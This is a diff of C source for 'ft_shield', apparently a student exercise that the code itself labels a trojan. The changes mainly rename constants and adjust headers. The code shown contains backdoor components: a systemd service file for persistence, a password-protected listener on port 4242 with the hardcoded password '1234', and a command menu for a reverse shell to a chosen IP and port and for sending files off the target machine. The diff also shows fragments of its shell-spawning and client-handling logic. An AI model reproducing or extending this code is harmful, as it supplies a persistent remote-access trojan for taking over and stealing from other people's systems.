@@ -1,5 +1,14 @@
-#include "../include/ft_shield.h"
+#include <libc.h>
+#include <poll.h>
+#include <ctype.h>
+#include <libgen.h>
+#include <stdbool.h>
 
+#define LOGINS					"orekabe & aabdou\n"
+#define SUDO					"You should run 'ft_shield' with sudo privilege\n"
+#define	MAX_CLIENT_CONNECTION	3
+#define	SERVER_PORT				4242
+#define	PASSWORD				"1234"
 #define SERVICE_FILE_CONTENT	"[Unit]\n"\
                             	"Description=ft_shield trojan\n"\
                             	"\n"\
@@ -14,30 +23,26 @@
                             	"\n"\
                             	"[Install]\n"\
                             	"WantedBy=multi-user.target\n"
-#define FT_SHIELD_COMMANDS	"Commands:\n"\
-							"   help - ?                                :     Shows this help message\n"\
-							"   exit                                    :     Close current client connection\n"\
-							"   shell                                   :     Create a remote shell connection\n"\
-							"   reverse <IPV4 ADDRESS> <PORT>           :     Create a reverse shell connection\n"\
-							"   send <IPV4 ADDRESS> <PORT> <FILE PATH>  :     Send a file from the target machine\n"\
-							"   receive <FILE PATH>                     :     Receive a file in the target machine\n"\
-							"\n"\
-							"INFO:\n"\
-							"   reverse: Create a reverse shell connection to the specified IPV4 address and port.\n"\
-							"            Usage: reverse <IPV4 ADDRESS> <PORT>\n"\
-							"            Note: Ensure that the target machine is listening on the specified port.\n"\
-							"\n"\
-							"   send: Send a file from the target machine to the specified IPV4 address and port.\n"\
-							"         Usage: send <IPV4 ADDRESS> <PORT> <FILE PATH>\n"\
-							"         Note: Ensure that the receiving machine is listening on the specified port.\n"\
-							"\n"\
-							"   receive: Receive a file in the target machine from a remote machine.\n"\
-							"            Usage: receive <FILE PATH>\n"\
-							"            Note: Ensure that the sending machine is connected and sending the file.\n"
-#define	COMMAND_NOT_FOUND	"ft_shield $> Command not found. use 'help' to get the help menu\n"
-#define	MAX_CLIENT_CONNECTION_COUNT	3
-#define	SERVER_PORT	4242
-#define	PASSWORD	"1234"
+#define FT_SHIELD_COMMANDS		"Commands:\n"\
+								"   help - ?                                :     Shows this help message\n"\
+								"   exit                                    :     Close current client connection\n"\
+								"   shell <IPV4 ADDRESS> <PORT>             :     Create a reverse shell connection\n"\
+								"   send <IPV4 ADDRESS> <PORT> <FILE PATH>  :     Send a file from the target machine\n"\
+								"   receive <FILE PATH>                     :     Receive a file in the target machine\n"\
+								"\n"\
+								"INFO:\n"\
+								"   shell  : Create a reverse shell connection to the specified IPV4 address and port.\n"\
+								"            Usage: shell <IPV4 ADDRESS> <PORT>\n"\
+								"            Note: Ensure that the target machine is listening on the specified port.\n"\
+								"\n"\
+								"   send   : Send a file from the target machine to the specified IPV4 address and port.\n"\
+								"            Usage: send <IPV4 ADDRESS> <PORT> <FILE PATH>\n"\
+								"            Note: Ensure that the receiving machine is listening on the specified port.\n"\
+								"\n"\
+								"   receive: Receive a file in the target machine from a remote machine.\n"\
+								"            Usage: receive <FILE PATH>\n"\
+								"            Note: Ensure that the sending machine is connected and sending the file.\n"
+#define	COMMAND_NOT_FOUND		"ft_shield $> Command not found. use 'help' to get the help menu\n"
 
 typedef	struct	client_info
 {
@@ -50,8 +55,8 @@ typedef	struct	server
 {
 	int				client_count;
 	int				server_sock;
-	struct	pollfd	clients[MAX_CLIENT_CONNECTION_COUNT + 1];
-	t_client_info	clients_info[MAX_CLIENT_CONNECTION_COUNT + 1];
+	struct	pollfd	clients[MAX_CLIENT_CONNECTION + 1];
+	t_client_info	clients_info[MAX_CLIENT_CONNECTION+1];
 }				t_server;
 
 t_server	*g_server;
@@ -79,7 +84,7 @@ void	sigchld_handler(int sig)
 
 	while ((pid = waitpid(-1, &status, WNOHANG)) > 0)
 	{
-		for (int i = 0; i < MAX_CLIENT_CONNECTION_COUNT+1; i++)
+		for (int i = 0; i < MAX_CLIENT_CONNECTION + 1; i++)
 		{
 			if (g_server->clients_info[i].shell_pid != pid)
 				continue;
@@ -231,7 +236,7 @@ int		init_server()
 		close(server_sock);
 		ft_error("bind");
 	}
-	if (listen(server_sock, MAX_CLIENT_CONNECTION_COUNT) < 0)
+	if (listen(server_sock, MAX_CLIENT_CONNECTION) < 0)
 	{
 		close(server_sock);
 		ft_error("listen");
@@ -241,7 +246,7 @@ int		init_server()
 
 void	clear_client_connection(int fd)
 {
-	for (int i = 0; i < MAX_CLIENT_CONNECTION_COUNT; i++)
+	for (int i = 0; i < MAX_CLIENT_CONNECTION; i++)
 	{
 		if (g_server->clients[i].fd != fd)
 			continue;
@@ -334,8 +339,8 @@ void	create_remote_shell_session(int client_fd, char *user_input)
 	}
 	sleep(1);
 	int status;
-    if (!waitpid(pid, &status, WNOHANG))
-        ok = true;
+	if (!waitpid(pid, &status, WNOHANG))
+		ok = true;
 	if (ok)
 		send_msg_to_client("Reverse shell created successfully!\n", client_fd);
 	else
@@ -415,7 +420,7 @@ void	client_connection()
 		close(client_fd);
 		return;
 	}
-	for (int i = 0; i < MAX_CLIENT_CONNECTION_COUNT+1; i++)
+	for (int i = 0; i < MAX_CLIENT_CONNECTION + 1; i++)
 	{
 		if (g_server->clients[i].fd != -1)
 			continue;
@@ -442,7 +447,7 @@ void	run_server(void)
 				clear_client_connection(g_server->clients[i].fd);
 			continue;
 		}
-		for (int i = 0; i < MAX_CLIENT_CONNECTION_COUNT+1; i++)
+		for (int i = 0; i < MAX_CLIENT_CONNECTION + 1; i++)
 		{
 			if (g_server->clients[i].fd == -1)
 				continue;
@@ -461,7 +466,7 @@ void	spawn_server(void)
 {
 	g_server = (t_server*)calloc(1, sizeof(t_server));
 
-	for (int i = 0; i < MAX_CLIENT_CONNECTION_COUNT+1; i++)
+	for (int i = 0; i < MAX_CLIENT_CONNECTION + 1; i++)
 	{
 		g_server->clients[i].fd = -1;
 		g_server->clients[i].events = POLLIN;
